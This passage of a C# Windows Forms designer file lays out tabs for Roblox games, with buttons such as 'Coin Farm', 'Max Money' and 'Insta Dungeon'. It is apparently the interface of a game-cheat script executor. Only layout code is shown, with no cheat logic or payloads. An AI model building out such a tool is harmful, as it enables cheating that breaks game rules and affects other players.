            // 
            this.flatButton111.BackColor = System.Drawing.Color.Transparent;
            this.flatButton111.BaseColor = System.Drawing.Color.Red;
            this.flatButton111.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton111.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton111.Location = new System.Drawing.Point(6, 6);
            this.flatButton111.Name = "flatButton111";
            this.flatButton111.Rounded = false;
            this.flatButton111.Size = new System.Drawing.Size(106, 35);
            this.flatButton111.TabIndex = 40;
            this.flatButton111.Text = "GUI 1";
            this.flatButton111.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton111.UseCustomColor = false;
            this.flatButton111.Click += new System.EventHandler(this.flatButton111_Click);
            // 
            // tabPage45
            // 
            this.tabPage45.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage45.Controls.Add(this.flatButton128);
            this.tabPage45.Controls.Add(this.pictureBox70);
            this.tabPage45.Controls.Add(this.flatButton129);
            this.tabPage45.Location = new System.Drawing.Point(4, 44);
            this.tabPage45.Name = "tabPage45";
            this.tabPage45.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage45.Size = new System.Drawing.Size(514, 249);
            this.tabPage45.TabIndex = 40;
            this.tabPage45.Text = "Boxing Simulator";
            // 
            // flatButton128
            // 
            this.flatButton128.BackColor = System.Drawing.Color.Transparent;
            this.flatButton128.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton128.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton128.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton128.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton128.Location = new System.Drawing.Point(557, 369);
            this.flatButton128.Name = "flatButton128";
            this.flatButton128.Rounded = false;
            this.flatButton128.Size = new System.Drawing.Size(106, 35);
            this.flatButton128.TabIndex = 55;
            this.flatButton128.Text = "Home";
            this.flatButton128.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton128.UseCustomColor = false;
            this.flatButton128.Click += new System.EventHandler(this.flatButton128_Click);
            // 
            // pictureBox70
            // 
            this.pictureBox70.Location = new System.Drawing.Point(514, 6);
            this.pictureBox70.Name = "pictureBox70";
            this.pictureBox70.Size = new System.Drawing.Size(149, 149);
            this.pictureBox70.TabIndex = 54;
            this.pictureBox70.TabStop = false;
            // 
            // flatButton129
            // 
            this.flatButton129.BackColor = System.Drawing.Color.Transparent;
            this.flatButton129.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton129.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton129.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton129.Location = new System.Drawing.Point(6, 6);
            this.flatButton129.Name = "flatButton129";
            this.flatButton129.Rounded = false;
            this.flatButton129.Size = new System.Drawing.Size(106, 35);
            this.flatButton129.TabIndex = 52;
            this.flatButton129.Text = "Coin Farm";
            this.flatButton129.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton129.UseCustomColor = false;
            this.flatButton129.Click += new System.EventHandler(this.flatButton129_Click);
            // 
            // tabPage48
            // 
            this.tabPage48.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage48.Controls.Add(this.flatButton18);
            this.tabPage48.Controls.Add(this.pictureBox78);
            this.tabPage48.Controls.Add(this.flatButton21);
            this.tabPage48.Location = new System.Drawing.Point(4, 44);
            this.tabPage48.Name = "tabPage48";
            this.tabPage48.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage48.Size = new System.Drawing.Size(514, 249);
            this.tabPage48.TabIndex = 44;
            this.tabPage48.Text = "Pet Simulator 2";
            // 
            // flatButton18
            // 
            this.flatButton18.BackColor = System.Drawing.Color.Transparent;
            this.flatButton18.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton18.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton18.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton18.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton18.Location = new System.Drawing.Point(557, 369);
            this.flatButton18.Name = "flatButton18";
            this.flatButton18.Rounded = false;
            this.flatButton18.Size = new System.Drawing.Size(106, 35);
            this.flatButton18.TabIndex = 67;
            this.flatButton18.Text = "Home";
            this.flatButton18.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton18.UseCustomColor = false;
            this.flatButton18.Click += new System.EventHandler(this.flatButton18_Click);
            // 
            // pictureBox78
            // 
            this.pictureBox78.Location = new System.Drawing.Point(514, 6);
            this.pictureBox78.Name = "pictureBox78";
            this.pictureBox78.Size = new System.Drawing.Size(149, 149);
            this.pictureBox78.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox78.TabIndex = 66;
            this.pictureBox78.TabStop = false;
            // 
            // flatButton21
            // 
            this.flatButton21.BackColor = System.Drawing.Color.Transparent;
            this.flatButton21.BaseColor = System.Drawing.Color.Red;
            this.flatButton21.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton21.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton21.Location = new System.Drawing.Point(6, 6);
            this.flatButton21.Name = "flatButton21";
            this.flatButton21.Rounded = false;
            this.flatButton21.Size = new System.Drawing.Size(106, 35);
            this.flatButton21.TabIndex = 64;
            this.flatButton21.Text = "GUI 1";
            this.flatButton21.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton21.UseCustomColor = false;
            this.flatButton21.Click += new System.EventHandler(this.flatButton21_Click);
            // 
            // tabPage51
            // 
            this.tabPage51.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage51.Controls.Add(this.flatButton12);
            this.tabPage51.Controls.Add(this.pictureBox17);
            this.tabPage51.Controls.Add(this.flatButton64);
            this.tabPage51.Location = new System.Drawing.Point(4, 44);
            this.tabPage51.Name = "tabPage51";
            this.tabPage51.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage51.Size = new System.Drawing.Size(514, 249);
            this.tabPage51.TabIndex = 46;
            this.tabPage51.Text = "Tree Planting Sim";
            // 
            // flatButton12
            // 
            this.flatButton12.BackColor = System.Drawing.Color.Transparent;
            this.flatButton12.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton12.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton12.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton12.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton12.Location = new System.Drawing.Point(559, 369);
            this.flatButton12.Name = "flatButton12";
            this.flatButton12.Rounded = false;
            this.flatButton12.Size = new System.Drawing.Size(106, 35);
            this.flatButton12.TabIndex = 22;
            this.flatButton12.Text = "Home";
            this.flatButton12.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton12.UseCustomColor = false;
            this.flatButton12.Click += new System.EventHandler(this.flatButton12_Click);
            // 
            // pictureBox17
            // 
            this.pictureBox17.Location = new System.Drawing.Point(512, 6);
            this.pictureBox17.Name = "pictureBox17";
            this.pictureBox17.Size = new System.Drawing.Size(149, 149);
            this.pictureBox17.TabIndex = 21;
            this.pictureBox17.TabStop = false;
            // 
            // flatButton64
            // 
            this.flatButton64.BackColor = System.Drawing.Color.Transparent;
            this.flatButton64.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton64.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton64.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton64.Location = new System.Drawing.Point(4, 6);
            this.flatButton64.Name = "flatButton64";
            this.flatButton64.Rounded = false;
            this.flatButton64.Size = new System.Drawing.Size(106, 35);
            this.flatButton64.TabIndex = 19;
            this.flatButton64.Text = "Coins";
            this.flatButton64.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton64.UseCustomColor = false;
            this.flatButton64.Click += new System.EventHandler(this.flatButton64_Click);
            // 
            // tabPage52
            // 
            this.tabPage52.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage52.Controls.Add(this.flatButton150);
            this.tabPage52.Controls.Add(this.pictureBox88);
            this.tabPage52.Controls.Add(this.flatButton151);
            this.tabPage52.Location = new System.Drawing.Point(4, 44);
            this.tabPage52.Name = "tabPage52";
            this.tabPage52.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage52.Size = new System.Drawing.Size(514, 249);
            this.tabPage52.TabIndex = 47;
            this.tabPage52.Text = "Pet Ranch Sim";
            // 
            // flatButton150
            // 
            this.flatButton150.BackColor = System.Drawing.Color.Transparent;
            this.flatButton150.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton150.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton150.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton150.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton150.Location = new System.Drawing.Point(559, 369);
            this.flatButton150.Name = "flatButton150";
            this.flatButton150.Rounded = false;
            this.flatButton150.Size = new System.Drawing.Size(106, 35);
            this.flatButton150.TabIndex = 26;
            this.flatButton150.Text = "Home";
            this.flatButton150.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton150.UseCustomColor = false;
            this.flatButton150.Click += new System.EventHandler(this.flatButton150_Click);
            // 
            // pictureBox88
            // 
            this.pictureBox88.Location = new System.Drawing.Point(512, 6);
            this.pictureBox88.Name = "pictureBox88";
            this.pictureBox88.Size = new System.Drawing.Size(149, 149);
            this.pictureBox88.TabIndex = 25;
            this.pictureBox88.TabStop = false;
            // 
            // flatButton151
            // 
            this.flatButton151.BackColor = System.Drawing.Color.Transparent;
            this.flatButton151.BaseColor = System.Drawing.Color.Red;
            this.flatButton151.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton151.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton151.Location = new System.Drawing.Point(4, 6);
            this.flatButton151.Name = "flatButton151";
            this.flatButton151.Rounded = false;
            this.flatButton151.Size = new System.Drawing.Size(106, 35);
            this.flatButton151.TabIndex = 23;
            this.flatButton151.Text = "GUI 1";
            this.flatButton151.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton151.UseCustomColor = false;
            this.flatButton151.Click += new System.EventHandler(this.flatButton151_Click);
            // 
            // tabPage58
            // 
            this.tabPage58.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage58.Controls.Add(this.flatButton162);
            this.tabPage58.Controls.Add(this.pictureBox94);
            this.tabPage58.Controls.Add(this.flatButton163);
            this.tabPage58.Location = new System.Drawing.Point(4, 44);
            this.tabPage58.Name = "tabPage58";
            this.tabPage58.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage58.Size = new System.Drawing.Size(514, 249);
            this.tabPage58.TabIndex = 53;
            this.tabPage58.Text = "Destruction Simulator";
            // 
            // flatButton162
            // 
            this.flatButton162.BackColor = System.Drawing.Color.Transparent;
            this.flatButton162.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton162.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton162.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton162.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton162.Location = new System.Drawing.Point(559, 369);
            this.flatButton162.Name = "flatButton162";
            this.flatButton162.Rounded = false;
            this.flatButton162.Size = new System.Drawing.Size(106, 35);
            this.flatButton162.TabIndex = 50;
            this.flatButton162.Text = "Home";
            this.flatButton162.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton162.UseCustomColor = false;
            this.flatButton162.Click += new System.EventHandler(this.flatButton162_Click);
            // 
            // pictureBox94
            // 
            this.pictureBox94.Location = new System.Drawing.Point(512, 6);
            this.pictureBox94.Name = "pictureBox94";
            this.pictureBox94.Size = new System.Drawing.Size(149, 149);
            this.pictureBox94.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox94.TabIndex = 49;
            this.pictureBox94.TabStop = false;
            // 
            // flatButton163
            // 
            this.flatButton163.BackColor = System.Drawing.Color.Transparent;
            this.flatButton163.BaseColor = System.Drawing.Color.Red;
            this.flatButton163.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton163.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton163.Location = new System.Drawing.Point(4, 6);
            this.flatButton163.Name = "flatButton163";
            this.flatButton163.Rounded = false;
            this.flatButton163.Size = new System.Drawing.Size(106, 35);
            this.flatButton163.TabIndex = 47;
            this.flatButton163.Text = "GUI 1";
            this.flatButton163.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton163.UseCustomColor = false;
            this.flatButton163.Click += new System.EventHandler(this.flatButton163_Click);
            // 
            // tabPage61
            // 
            this.tabPage61.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage61.Controls.Add(this.flatButton32);
            this.tabPage61.Controls.Add(this.pictureBox19);
            this.tabPage61.Controls.Add(this.flatButton66);
            this.tabPage61.Location = new System.Drawing.Point(4, 44);
            this.tabPage61.Name = "tabPage61";
            this.tabPage61.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage61.Size = new System.Drawing.Size(514, 249);
            this.tabPage61.TabIndex = 56;
            this.tabPage61.Text = "Ro-Ghoul";
            // 
            // flatButton32
            // 
            this.flatButton32.BackColor = System.Drawing.Color.Transparent;
            this.flatButton32.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton32.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton32.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton32.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton32.Location = new System.Drawing.Point(557, 369);
            this.flatButton32.Name = "flatButton32";
            this.flatButton32.Rounded = false;
            this.flatButton32.Size = new System.Drawing.Size(106, 35);
            this.flatButton32.TabIndex = 24;
            this.flatButton32.Text = "Home";
            this.flatButton32.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton32.UseCustomColor = false;
            this.flatButton32.Click += new System.EventHandler(this.flatButton32_Click);
            // 
            // pictureBox19
            // 
            this.pictureBox19.Location = new System.Drawing.Point(514, 6);
            this.pictureBox19.Name = "pictureBox19";
            this.pictureBox19.Size = new System.Drawing.Size(149, 149);
            this.pictureBox19.TabIndex = 23;
            this.pictureBox19.TabStop = false;
            // 
            // flatButton66
            // 
            this.flatButton66.BackColor = System.Drawing.Color.Transparent;
            this.flatButton66.BaseColor = System.Drawing.Color.Red;
            this.flatButton66.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton66.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton66.Location = new System.Drawing.Point(6, 6);
            this.flatButton66.Name = "flatButton66";
            this.flatButton66.Rounded = false;
            this.flatButton66.Size = new System.Drawing.Size(106, 35);
            this.flatButton66.TabIndex = 21;
            this.flatButton66.Text = "GUI 1";
            this.flatButton66.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton66.UseCustomColor = false;
            this.flatButton66.Click += new System.EventHandler(this.flatButton66_Click);
            // 
            // tabPage64
            // 
            this.tabPage64.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage64.Controls.Add(this.label3);
            this.tabPage64.Controls.Add(this.flatButton277);
            this.tabPage64.Controls.Add(this.flatButton178);
            this.tabPage64.Controls.Add(this.pictureBox106);
            this.tabPage64.Controls.Add(this.flatButton179);
            this.tabPage64.Location = new System.Drawing.Point(4, 44);
            this.tabPage64.Name = "tabPage64";
            this.tabPage64.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage64.Size = new System.Drawing.Size(514, 249);
            this.tabPage64.TabIndex = 59;
            this.tabPage64.Text = "Dungeon Quest";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(118, 44);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(134, 15);
            this.label3.TabIndex = 38;
            this.label3.Text = "Execute In Dungeon";
            // 
            // flatButton277
            // 
            this.flatButton277.BackColor = System.Drawing.Color.Transparent;
            this.flatButton277.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton277.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton277.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton277.Location = new System.Drawing.Point(118, 6);
            this.flatButton277.Name = "flatButton277";
            this.flatButton277.Rounded = false;
            this.flatButton277.Size = new System.Drawing.Size(135, 35);
            this.flatButton277.TabIndex = 37;
            this.flatButton277.Text = "Insta Dungeon";
            this.flatButton277.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton277.UseCustomColor = false;
            this.flatButton277.Click += new System.EventHandler(this.flatButton277_Click);
            // 
            // flatButton178
            // 
            this.flatButton178.BackColor = System.Drawing.Color.Transparent;
            this.flatButton178.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton178.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton178.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton178.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton178.Location = new System.Drawing.Point(557, 369);
            this.flatButton178.Name = "flatButton178";
            this.flatButton178.Rounded = false;
            this.flatButton178.Size = new System.Drawing.Size(106, 35);
            this.flatButton178.TabIndex = 36;
            this.flatButton178.Text = "Home";
            this.flatButton178.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton178.UseCustomColor = false;
            this.flatButton178.Click += new System.EventHandler(this.flatButton178_Click);
            // 
            // pictureBox106
            // 
            this.pictureBox106.Location = new System.Drawing.Point(514, 6);
            this.pictureBox106.Name = "pictureBox106";
            this.pictureBox106.Size = new System.Drawing.Size(149, 149);
            this.pictureBox106.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox106.TabIndex = 35;
            this.pictureBox106.TabStop = false;
            // 
            // flatButton179
            // 
            this.flatButton179.BackColor = System.Drawing.Color.Transparent;
            this.flatButton179.BaseColor = System.Drawing.Color.Red;
            this.flatButton179.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton179.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton179.Location = new System.Drawing.Point(6, 6);
            this.flatButton179.Name = "flatButton179";
            this.flatButton179.Rounded = false;
            this.flatButton179.Size = new System.Drawing.Size(106, 35);
            this.flatButton179.TabIndex = 33;
            this.flatButton179.Text = "GUI 1";
            this.flatButton179.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton179.UseCustomColor = false;
            this.flatButton179.Click += new System.EventHandler(this.flatButton179_Click);
            // 
            // tabPage65
            // 
            this.tabPage65.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage65.Controls.Add(this.flatButton180);
            this.tabPage65.Controls.Add(this.pictureBox107);
            this.tabPage65.Controls.Add(this.flatButton181);
            this.tabPage65.Location = new System.Drawing.Point(4, 44);
            this.tabPage65.Name = "tabPage65";
            this.tabPage65.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage65.Size = new System.Drawing.Size(514, 249);
            this.tabPage65.TabIndex = 60;
            this.tabPage65.Text = "Dragon Ball Z Final Stand";
            // 
            // flatButton180
            // 
            this.flatButton180.BackColor = System.Drawing.Color.Transparent;
            this.flatButton180.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton180.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton180.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton180.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton180.Location = new System.Drawing.Point(557, 369);
            this.flatButton180.Name = "flatButton180";
            this.flatButton180.Rounded = false;
            this.flatButton180.Size = new System.Drawing.Size(106, 35);
            this.flatButton180.TabIndex = 39;
            this.flatButton180.Text = "Home";
            this.flatButton180.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton180.UseCustomColor = false;
            this.flatButton180.Click += new System.EventHandler(this.flatButton180_Click);
            // 
            // pictureBox107
            // 
            this.pictureBox107.Location = new System.Drawing.Point(514, 6);
            this.pictureBox107.Name = "pictureBox107";
            this.pictureBox107.Size = new System.Drawing.Size(149, 149);
            this.pictureBox107.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox107.TabIndex = 38;
            this.pictureBox107.TabStop = false;
            // 
            // flatButton181
            // 
            this.flatButton181.BackColor = System.Drawing.Color.Transparent;
            this.flatButton181.BaseColor = System.Drawing.Color.Red;
            this.flatButton181.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton181.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton181.Location = new System.Drawing.Point(6, 6);
            this.flatButton181.Name = "flatButton181";
            this.flatButton181.Rounded = false;
            this.flatButton181.Size = new System.Drawing.Size(106, 35);
            this.flatButton181.TabIndex = 37;
            this.flatButton181.Text = "GUI 1";
            this.flatButton181.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton181.UseCustomColor = false;
            this.flatButton181.Click += new System.EventHandler(this.flatButton181_Click);
            // 
            // tabPage66
            // 
            this.tabPage66.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage66.Controls.Add(this.flatButton182);
            this.tabPage66.Controls.Add(this.pictureBox108);
            this.tabPage66.Controls.Add(this.flatButton183);
            this.tabPage66.Location = new System.Drawing.Point(4, 44);
            this.tabPage66.Name = "tabPage66";
            this.tabPage66.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage66.Size = new System.Drawing.Size(514, 249);
            this.tabPage66.TabIndex = 61;
            this.tabPage66.Text = "Work at a Pizza Place";
            // 
            // flatButton182
            // 
            this.flatButton182.BackColor = System.Drawing.Color.Transparent;
            this.flatButton182.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton182.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton182.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton182.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton182.Location = new System.Drawing.Point(557, 369);
            this.flatButton182.Name = "flatButton182";
            this.flatButton182.Rounded = false;
            this.flatButton182.Size = new System.Drawing.Size(106, 35);
            this.flatButton182.TabIndex = 42;
            this.flatButton182.Text = "Home";
            this.flatButton182.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton182.UseCustomColor = false;
            this.flatButton182.Click += new System.EventHandler(this.flatButton182_Click);
            // 
            // pictureBox108
            // 
            this.pictureBox108.Location = new System.Drawing.Point(514, 6);
            this.pictureBox108.Name = "pictureBox108";
            this.pictureBox108.Size = new System.Drawing.Size(149, 149);
            this.pictureBox108.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox108.TabIndex = 41;
            this.pictureBox108.TabStop = false;
            // 
            // flatButton183
            // 
            this.flatButton183.BackColor = System.Drawing.Color.Transparent;
            this.flatButton183.BaseColor = System.Drawing.Color.Red;
            this.flatButton183.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton183.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton183.Location = new System.Drawing.Point(6, 6);
            this.flatButton183.Name = "flatButton183";
            this.flatButton183.Rounded = false;
            this.flatButton183.Size = new System.Drawing.Size(106, 35);
            this.flatButton183.TabIndex = 40;
            this.flatButton183.Text = "GUI 1";
            this.flatButton183.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton183.UseCustomColor = false;
            this.flatButton183.Click += new System.EventHandler(this.flatButton183_Click);
            // 
            // tabPage67
            // 
            this.tabPage67.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage67.Controls.Add(this.flatButton184);
            this.tabPage67.Controls.Add(this.pictureBox109);
            this.tabPage67.Controls.Add(this.flatButton185);
            this.tabPage67.Location = new System.Drawing.Point(4, 44);
            this.tabPage67.Name = "tabPage67";
            this.tabPage67.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage67.Size = new System.Drawing.Size(514, 249);
            this.tabPage67.TabIndex = 62;
            this.tabPage67.Text = "Donut Shop Tycoon";
            // 
            // flatButton184
            // 
            this.flatButton184.BackColor = System.Drawing.Color.Transparent;
            this.flatButton184.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton184.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton184.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton184.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton184.Location = new System.Drawing.Point(557, 369);
            this.flatButton184.Name = "flatButton184";
            this.flatButton184.Rounded = false;
            this.flatButton184.Size = new System.Drawing.Size(106, 35);
            this.flatButton184.TabIndex = 36;
            this.flatButton184.Text = "Home";
            this.flatButton184.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton184.UseCustomColor = false;
            this.flatButton184.Click += new System.EventHandler(this.flatButton184_Click);
            // 
            // pictureBox109
            // 
            this.pictureBox109.Location = new System.Drawing.Point(514, 6);
            this.pictureBox109.Name = "pictureBox109";
            this.pictureBox109.Size = new System.Drawing.Size(149, 149);
            this.pictureBox109.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox109.TabIndex = 35;
            this.pictureBox109.TabStop = false;
            // 
            // flatButton185
            // 
            this.flatButton185.BackColor = System.Drawing.Color.Transparent;
            this.flatButton185.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton185.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton185.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton185.Location = new System.Drawing.Point(6, 6);
            this.flatButton185.Name = "flatButton185";
            this.flatButton185.Rounded = false;
            this.flatButton185.Size = new System.Drawing.Size(106, 35);
            this.flatButton185.TabIndex = 33;
            this.flatButton185.Text = "Max Money";
            this.flatButton185.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton185.UseCustomColor = false;
            this.flatButton185.Click += new System.EventHandler(this.flatButton185_Click);
            // 
            // tabPage70
            // 
            this.tabPage70.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(70)))), ((int)(((byte)(73)))));
            this.tabPage70.Controls.Add(this.flatButton197);
            this.tabPage70.Controls.Add(this.pictureBox119);
            this.tabPage70.Controls.Add(this.flatButton198);
            this.tabPage70.Location = new System.Drawing.Point(4, 44);
            this.tabPage70.Name = "tabPage70";
            this.tabPage70.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage70.Size = new System.Drawing.Size(514, 249);
            this.tabPage70.TabIndex = 65;
            this.tabPage70.Text = "Restaurant Tycoon 2";
            // 
            // flatButton197
            // 
            this.flatButton197.BackColor = System.Drawing.Color.Transparent;
            this.flatButton197.BaseColor = System.Drawing.Color.Crimson;
            this.flatButton197.Cursor = System.Windows.Forms.Cursors.Hand;
            this.flatButton197.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.flatButton197.ForeColor = System.Drawing.Color.CornflowerBlue;
            this.flatButton197.Location = new System.Drawing.Point(557, 369);
            this.flatButton197.Name = "flatButton197";
            this.flatButton197.Rounded = false;
            this.flatButton197.Size = new System.Drawing.Size(106, 35);
            this.flatButton197.TabIndex = 48;
            this.flatButton197.Text = "Home";
            this.flatButton197.TextColor = System.Drawing.Color.FromArgb(((int)(((byte)(243)))), ((int)(((byte)(243)))), ((int)(((byte)(243)))));
            this.flatButton197.UseCustomColor = false;
            this.flatButton197.Click += new System.EventHandler(this.flatButton197_Click);
            // 
            // pictureBox119
            // 
            this.pictureBox119.Location = new System.Drawing.Point(514, 6);
